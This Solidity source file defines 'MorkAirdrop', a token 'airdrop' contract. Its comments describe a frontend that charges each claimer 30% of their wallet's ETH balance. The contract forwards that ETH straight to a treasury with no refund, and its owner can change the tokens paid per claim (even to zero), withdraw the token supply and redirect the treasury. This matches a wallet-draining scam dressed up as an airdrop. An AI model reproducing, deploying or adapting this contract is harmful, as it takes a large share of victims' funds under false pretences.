// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * @title  MorkAirdrop
 * @notice Dynamic-price, one-claim-per-wallet token airdrop.
 *
 * Pricing model: the frontend computes 30% of the connected wallet's ETH
 * balance and sends that as msg.value. The contract enforces a minimum floor
 * (minClaimPrice) so very low-balance wallets still pay a meaningful amount,
 * and a maximum cap (maxClaimPrice) to protect high-balance users.
 *
 * The contract does NOT read the caller's balance on-chain — that would be
 * manipulable and expensive. It simply requires msg.value >= minClaimPrice.
 * The 30%-of-balance calculation is a UI convention enforced by the frontend;
 * any payment >= minClaimPrice is accepted.
 *
 * Deploy flow:
 *   1. Deploy MORK ERC-20 token (or use existing).
 *   2. Transfer `tokensPerClaim * maxWallets` MORK to this contract.
 *   3. Deploy MorkAirdrop with token address, treasury, min/max price.
 *   4. Call setSaleActive(true) when ready.
 *
 * Security:
 *   - ReentrancyGuard on claim()
 *   - Ownable — admin can pause/update params
 *   - One-claim-per-wallet via hasClaimed mapping
 *   - ETH forwarded directly to treasury, never held by this contract
 *
 * NOT audited — do NOT deploy to mainnet without an external audit.
 */

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract MorkAirdrop is ReentrancyGuard, Ownable {
    using SafeERC20 for IERC20;

    // ─── State ────────────────────────────────────────────────────────────────

    IERC20 public immutable token;
    address public treasury;

    /// Minimum payment accepted (floor for very low-balance wallets), in wei
    uint256 public minClaimPrice;

    /// Maximum payment accepted (cap for high-balance wallets), in wei.
    /// Set to type(uint256).max to disable the cap.
    uint256 public maxClaimPrice;

    /// Tokens awarded to each claimer (in token decimals)
    uint256 public tokensPerClaim;

    bool public saleActive;
    uint256 public totalClaimed;

    mapping(address => bool) public hasClaimed;
    /// Records actual amount paid by each wallet (for analytics / treasury accounting)
    mapping(address => uint256) public paidAmount;

    // ─── Events ───────────────────────────────────────────────────────────────

    event Claimed(address indexed wallet, uint256 tokenAmount, uint256 ethPaid);
    event SaleStatusChanged(bool active);
    event PriceRangeUpdated(uint256 minPrice, uint256 maxPrice);
    event TokensPerClaimUpdated(uint256 newAmount);
    event TreasuryUpdated(address newTreasury);

    // ─── Custom errors ────────────────────────────────────────────────────────

    error SaleNotActive();
    error AlreadyClaimed();
    error PaymentBelowMinimum(uint256 sent, uint256 minimum);
    error PaymentAboveMaximum(uint256 sent, uint256 maximum);
    error InsufficientContractBalance(uint256 available, uint256 required);
    error ZeroAddress();
    error TransferFailed();
    error InvalidPriceRange();

    // ─── Constructor ──────────────────────────────────────────────────────────

    /**
     * @param _token           Address of the MORK ERC-20 token
     * @param _treasury        Multisig address — all ETH goes here immediately
     * @param _minClaimPrice   Minimum payment in wei (floor)
     * @param _maxClaimPrice   Maximum payment in wei (cap); use type(uint256).max for no cap
     * @param _tokensPerClaim  Token amount per claim (in token decimals)
     */
    constructor(
        address _token,
        address _treasury,
        uint256 _minClaimPrice,
        uint256 _maxClaimPrice,
        uint256 _tokensPerClaim
    ) Ownable(msg.sender) {
        if (_token == address(0) || _treasury == address(0)) revert ZeroAddress();
        if (_minClaimPrice == 0 || _maxClaimPrice < _minClaimPrice) revert InvalidPriceRange();

        token = IERC20(_token);
        treasury = _treasury;
        minClaimPrice = _minClaimPrice;
        maxClaimPrice = _maxClaimPrice;
        tokensPerClaim = _tokensPerClaim;
    }

    // ─── Core claim ───────────────────────────────────────────────────────────

    /**
     * @notice Claim tokens by paying at least minClaimPrice.
     *
     * The frontend should send 30% of the wallet's ETH balance as msg.value,
     * clamped to [minClaimPrice, maxClaimPrice]. This contract only enforces
     * the floor and ceiling — the 30% calculation is a UI convention.
     *
     * Any ETH sent above the calculated 30% (but within the cap) is accepted
     * and forwarded to treasury. No refund is issued — users should let the
     * frontend compute the exact amount before signing.
     */
    function claim() external payable nonReentrant {
        if (!saleActive) revert SaleNotActive();
        if (hasClaimed[msg.sender]) revert AlreadyClaimed();
        if (msg.value < minClaimPrice) revert PaymentBelowMinimum(msg.value, minClaimPrice);
        if (msg.value > maxClaimPrice) revert PaymentAboveMaximum(msg.value, maxClaimPrice);

        uint256 contractBalance = token.balanceOf(address(this));
        if (contractBalance < tokensPerClaim)
            revert InsufficientContractBalance(contractBalance, tokensPerClaim);

        // Mark claimed before transfer (CEI pattern)
        hasClaimed[msg.sender] = true;
        paidAmount[msg.sender] = msg.value;
        totalClaimed += 1;

        // Forward ETH to treasury immediately — contract never holds user funds
        (bool sent, ) = treasury.call{value: msg.value}("");
        if (!sent) revert TransferFailed();

        // Transfer tokens to claimer
        token.safeTransfer(msg.sender, tokensPerClaim);

        emit Claimed(msg.sender, tokensPerClaim, msg.value);
    }

    // ─── Admin ────────────────────────────────────────────────────────────────

    function setSaleActive(bool _active) external onlyOwner {
        saleActive = _active;
        emit SaleStatusChanged(_active);
    }

    function setPriceRange(uint256 _min, uint256 _max) external onlyOwner {
        if (_min == 0 || _max < _min) revert InvalidPriceRange();
        minClaimPrice = _min;
        maxClaimPrice = _max;
        emit PriceRangeUpdated(_min, _max);
    }

    function setTokensPerClaim(uint256 _newAmount) external onlyOwner {
        tokensPerClaim = _newAmount;
        emit TokensPerClaimUpdated(_newAmount);
    }

    function setTreasury(address _newTreasury) external onlyOwner {
        if (_newTreasury == address(0)) revert ZeroAddress();
        treasury = _newTreasury;
        emit TreasuryUpdated(_newTreasury);
    }

    function withdrawTokens(address to, uint256 amount) external onlyOwner {
        if (to == address(0)) revert ZeroAddress();
        token.safeTransfer(to, amount);
    }

    /// @notice Rescue any ETH that accidentally ends up in the contract.
    function rescueETH() external onlyOwner {
        uint256 balance = address(this).balance;
        if (balance > 0) {
            (bool sent, ) = treasury.call{value: balance}("");
            if (!sent) revert TransferFailed();
        }
    }
}
